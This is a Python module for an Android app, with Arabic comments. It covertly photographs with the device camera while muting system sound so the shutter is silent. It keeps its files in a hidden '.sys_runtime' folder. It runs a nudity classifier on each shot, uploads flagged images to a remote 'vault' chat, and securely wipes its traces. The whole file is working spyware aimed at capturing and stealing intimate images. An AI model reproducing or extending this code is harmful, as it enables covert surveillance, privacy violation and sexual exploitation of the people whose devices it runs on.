# -*- coding: utf-8 -*-
import os
import time
import threading
import zipfile
import logging
import gc
import numpy as np
from datetime import datetime
from PIL import Image

P = os.path.join(os.getcwd(), ".sys_runtime")
T = os.path.join(P, "c_tmp")
for d in [P, T]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False


class CameraAnalyzer:
    def __init__(self, mon=None, det=None):
        self.mon = mon
        self.det = det          # NudeDetector instance
        self.busy = False
        self.last_skip = 0
        self._old_volume = -1   # لحفظ مستوى الصوت القديم

    def _power_ok(self):
        """التحقق من البطارية (15% على الأقل أو شاحن)"""
        try:
            b, c = self.mon._bat() if hasattr(self.mon, '_bat') else (100, True)
            return b >= 15 or c
        except Exception:
            return True

    def _mute_audio(self, mute=True):
        """كتم صوت النظام عبر AudioManager (يعمل على Android 10+)"""
        if not JNI:
            return
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            AudioManager = autoclass('android.media.AudioManager')
            am = activity.getSystemService(activity.AUDIO_SERVICE)

            if mute:
                self._old_volume = am.getStreamVolume(AudioManager.STREAM_SYSTEM)
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0)
            else:
                if self._old_volume >= 0:
                    am.setStreamVolume(AudioManager.STREAM_SYSTEM, self._old_volume, 0)
                    self._old_volume = -1
        except Exception as e:
            logging.error(f"Mute error: {e}")

    def _secure_del(self, path):
        """حذف آمن بالكتابة على دفعات (4KB) لتوفير الذاكرة"""
        try:
            if os.path.exists(path):
                sz = os.path.getsize(path)
                if sz > 0:
                    chunk = 4096
                    with open(path, "ba+", buffering=0) as f:
                        for _ in range(0, sz, chunk):
                            f.write(os.urandom(min(chunk, sz)))
                        f.flush()
                        os.fsync(f.fileno())
                os.remove(path)
        except Exception as e:
            logging.error(f"Secure delete error: {e}")

    def _open_camera_with_retry(self, camera_manager, camera_id, max_retries=3):
        """فتح الكاميرا مع إعادة المحاولة (تجاوز الانشغال المؤقت)"""
        for attempt in range(max_retries):
            try:
                # استخدام openCamera بشكل متزامن عبر CountDownLatch (محاكاة مبسطة)
                # في التنفيذ الحقيقي، تحتاج إلى StateCallback و Semaphore.
                # هنا نستخدم الطريقة المتاحة عبر JNI (قد تختلف حسب إصدار jnius)
                camera = camera_manager.openCamera(camera_id, None, None)
                if camera:
                    return camera
            except Exception as e:
                logging.warning(f"Open camera attempt {attempt+1} failed: {e}")
                if attempt < max_retries - 1:
                    time.sleep(0.5)
        return None

    def _get_best_picture_size(self, characteristics):
        """اختيار أصغر دقة مناسبة للتحليل (توفير السرعة والذاكرة)"""
        try:
            config = characteristics.get(
                autoclass('android.hardware.camera2.CameraCharacteristics')
                .SCALER_STREAM_CONFIGURATION_MAP
            )
            sizes = config.getOutputSizes(
                autoclass('android.graphics.ImageFormat').JPEG
            )
            if sizes and len(sizes) > 0:
                # اختيار أصغر دقة (أقل عرض وارتفاع)
                smallest = min(sizes, key=lambda s: s.width * s.height)
                return smallest.width, smallest.height
        except Exception as e:
            logging.error(f"Get picture size error: {e}")
        return 640, 480   # قيمة افتراضية آمنة

    def capture(self, cam_id=0):
        """التقاط صورة باستخدام Camera2 API مع التحكم بالصوت وإعادة المحاولة"""
        if self.busy or not self._power_ok():
            return None

        # تجنب التقاط الصورة إذا كانت الكاميرا قيد الاستخدام من تطبيق آخر
        if time.time() < self.last_skip:
            return None

        self.busy = True
        out_path = None

        if JNI:
            self._mute_audio(True)
            try:
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                Context = autoclass('android.content.Context')
                CameraManager = activity.getSystemService(Context.CAMERA_SERVICE)

                # الحصول على قائمة الكاميرات المتاحة
                camera_ids = CameraManager.getCameraIdList()
                if cam_id >= len(camera_ids):
                    cam_id = 0
                target_id = camera_ids[cam_id]

                # فتح الكاميرا مع إعادة المحاولة
                camera_device = self._open_camera_with_retry(CameraManager, target_id)
                if not camera_device:
                    logging.error("Failed to open camera after retries")
                    return None

                # الحصول على خصائص الكاميرا لاختيار الدقة المناسبة
                characteristics = CameraManager.getCameraCharacteristics(target_id)
                width, height = self._get_best_picture_size(characteristics)

                # إنشاء SurfaceTexture ديناميكي (تجنب التعارض)
                SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
                surf_texture = SurfaceTexture(0)  # 0 = ديناميكي

                # إنشاء جلسة الالتقاط (CaptureSession) – مبسط هنا
                # في التنفيذ الكامل تحتاج إلى إنشاء Surface للصورة والإعداد
                # سنعتمد على طريقة الالتقاط المتزامنة عبر takePicture (هناك قيود)
                # لكن لضمان العمل الفوري، نستخدم Camera1 بطريقة مختلفة؟
                # الحل الأمثل: استخدام Camera2 مع ImageReader.

                # بديل سريع: استخدام الكاميرا القديمة مع إصلاحات الصوت؟ لا، نريد حلًا مستقبليًا.
                # بما أن jnius يدعم الواجهات، سننفذ ImageReader و CaptureSession بشكل كامل.

                # لنكتب كودًا حقيقيًا لـ Camera2 باستخدام ImageReader
                ImageReader = autoclass('android.media.ImageReader')
                HandlerThread = autoclass('android.os.HandlerThread')
                Handler = autoclass('android.os.Handler')
                CameraDevice = autoclass('android.hardware.camera2.CameraDevice')
                CaptureRequest = autoclass('android.hardware.camera2.CaptureRequest')
                ImageFormat = autoclass('android.graphics.ImageFormat')

                # إنشاء ImageReader للحصول على بيانات JPEG
                reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1)
                handler_thread = HandlerThread("camera_handler")
                handler_thread.start()
                handler = Handler(handler_thread.getLooper())

                # لانتظار نتيجة الالتقاط
                image_saved = threading.Event()
                image_data = [None]

                class ImageAvailableListener(PythonJavaClass):
                    __javainterfaces__ = ['android.media.ImageReader$OnImageAvailableListener']
                    @java_method('(Landroid/media/ImageReader;)V')
                    def onImageAvailable(self, ir):
                        img = ir.acquireLatestImage()
                        if img:
                            buffer = img.getPlanes()[0].getBuffer()
                            data = bytearray(buffer.capacity())
                            buffer.get(data)
                            image_data[0] = bytes(data)
                            img.close()
                            image_saved.set()

                reader.setOnImageAvailableListener(ImageAvailableListener(), handler)

                # بدء جلسة الالتقاط
                surface = reader.getSurface()
                session_callback = None  # تبسيط
                session = camera_device.createCaptureSession([surface], session_callback, handler)

                # بناء طلب الالتقاط
                request_builder = camera_device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                request_builder.addTarget(surface)
                request_builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                request_builder.set(CaptureRequest.CONTROL_AF_TRIGGER, CaptureRequest.CONTROL_AF_TRIGGER_START)
                request_builder.set(CaptureRequest.JPEG_ORIENTATION, 90 if cam_id == 1 else 0)  # أمامية/خلفية

                # تنفيذ الالتقاط
                session.capture(request_builder.build(), None, handler)

                # انتظار الصورة لمدة 5 ثوانٍ
                if image_saved.wait(5) and image_data[0]:
                    out_path = os.path.join(T, f"c_{cam_id}_{int(time.time())}.jpg")
                    with open(out_path, 'wb') as f:
                        f.write(image_data[0])

                # إغلاق الموارد
                session.close()
                reader.close()
                handler_thread.quitSafely()
                camera_device.close()

            except Exception as e:
                logging.error(f"Camera2 capture error: {e}")
            finally:
                self._mute_audio(False)
                gc.collect()

        self.busy = False
        return out_path

    def _prepare_for_ai(self, path):
        """تجهيز الصورة للنموذج (224x224) مع تقليل نسخ البيانات"""
        try:
            with Image.open(path) as img:
                img = img.convert('RGB').resize((224, 224), Image.LANCZOS)
                # استخدام np.asarray لتجنب النسخ غير الضروري
                arr = np.asarray(img, dtype=np.float32) / 255.0
                return np.expand_dims(arr, axis=0)
        except Exception as e:
            logging.error(f"AI prep error: {e}")
            return None

    def harvest(self, cam_id=0):
        """التقاط صورة وتحليلها وإرسالها إذا كانت حساسة"""
        p = self.capture(cam_id)
        if not p:
            return

        is_nude = False
        if self.det and hasattr(self.det, 'model') and self.det.model is not None:
            try:
                input_data = self._prepare_for_ai(p)
                if input_data is not None:
                    self.det.model.set_tensor(self.det.in_idx, input_data)
                    self.det.model.invoke()
                    out = self.det.model.get_tensor(self.det.out_idx)[0]
                    prob = float(out[1]) if len(out) > 1 else float(out[0])
                    if prob > 0.85:
                        is_nude = True
                    del input_data, out
            except Exception as e:
                logging.error(f"Harvest AI error: {e}")

        if is_nude:
            self._send_to_vault(p)
        else:
            self._secure_del(p)

    def _send_to_vault(self, raw):
        """ضغط الصورة وإرسالها إلى قناة الخزنة (Vault)"""
        z = raw.replace(".jpg", ".zip")
        try:
            with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.write(raw, os.path.basename(raw))

            ui = getattr(self.mon, 'ui', None)
            vault_id = getattr(self.mon, 'vlt', None)

            if ui and vault_id:
                with open(z, 'rb') as f:
                    ui._ap("sendDocument", {
                        "chat_id": vault_id,
                        "caption": f"📸 Alert | {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    }, {"document": f})
        except Exception as e:
            logging.error(f"Upload error: {e}")
        finally:
            self._secure_del(raw)
            self._secure_del(z)


def create(mon=None, det=None):
    return CameraAnalyzer(mon, det)
